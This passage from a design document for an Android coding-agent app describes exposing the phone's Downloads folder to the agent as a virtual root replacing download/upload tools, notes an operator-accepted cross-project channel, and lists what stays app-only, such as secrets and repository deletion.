and every path-based tool take `java.io.File`. So a SAF-backed folder needs a copy-in/copy-out layer.
That layer is **the code `download`/`upload` already are** — so the verbs do not disappear from the
implementation, only from the agent's view.

### 13e.4 What the agent sees

**A `Downloads` row in the worktree screen, and one named exception in the path rules.**

- The row is **virtual**: it is not in the worktree, so it is not in the repository, so **it is
  gitignored automatically and free**. No `.gitignore` line is needed, and none should be added — a line
  for a folder that does not exist would be a rule about nothing.
- `read`/`ls`/`write` treat the name `Downloads` as a second root. **The exception is by name, not by
  path**, because a path check is defeated by a symlink and `withinProject` (`AgentTools.kt:1912`)
  already resolves canonically for exactly that reason.
- **The three verbs go away**: `downloads`, `download`, `upload` are deleted from the tool set. The
  agent uses `read`, `write` and `ls` on a folder it already understands, which is the ergonomic win
  that survives even though the bytes move the same way.

**`withinProject` is not widened.** It keeps answering about the account folder; `Downloads` is a
separate root checked beside it, so the rule that everything the agent can reach is under one folder
stays true for the repository side.

### 13e.5 The cross-project consequence, accepted by the operator

**Downloads is a phone folder, not a project folder.** Put it in every worktree and:

- project A's agent can read a file project B's agent left there;
- two branches show the same folder, including two agents running at once.

**The operator accepted this:** *"Yes — it's my Downloads."* It is their own folder, they can see it
too, and it is the channel they asked for. It is recorded here because it is a real cross-project
channel and the next person to read this should not have to rediscover it.

### 13e.6 What is not settled

- **The grant prompt is a new first-run step.** Every other permission this app asks for is either
  automatic or refused outright; this one is a person choosing a folder. It belongs on the same screen
  as the account list, and **the app must work with the grant refused** — Downloads absent, not broken.
- **`MediaStore` is still how the trace log is written**, and that stays: it is the app's own file, and
  ownership is exactly what makes it work.
- **A file with no `MediaStore` row** (dropped by a shell, or by an old app) is invisible to a
  `MediaStore` query but **visible through the SAF tree**, which is a second reason to prefer SAF.

## 14. What this does not solve

- **CI portability.** §1's missing quarter. `http` makes providers reachable, never interchangeable.
- **Secrets stay app-only.** `http` reads the vault; it cannot write one. A `PUT` to a secrets endpoint
  could overwrite the keystore and silently break releases, and nothing would report it.
- **Repo creation and deletion stay app-only.** `DELETE /repos/…` has no undo.
- **`browse` and `shot` still need the device's WebView.** A phone that has not updated WebView renders an
  old engine, and no config file changes that.
- **The model layer stays OpenAI-shaped.** A provider that does not speak `chat/completions` needs a parser,
  not a config.
